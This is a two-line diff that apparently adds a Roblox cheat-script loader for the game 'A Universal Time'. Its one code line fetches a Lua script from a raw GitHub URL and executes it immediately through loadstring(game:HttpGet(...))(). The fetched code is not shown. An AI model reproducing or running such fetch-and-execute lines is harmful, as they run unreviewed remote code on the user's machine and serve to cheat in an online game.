@@ -1,0 +1,2 @@
+--UNKNOWN LEVEL
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Donut3339/myscriptxd/master/A%20Universal%20Time.lua", true))()
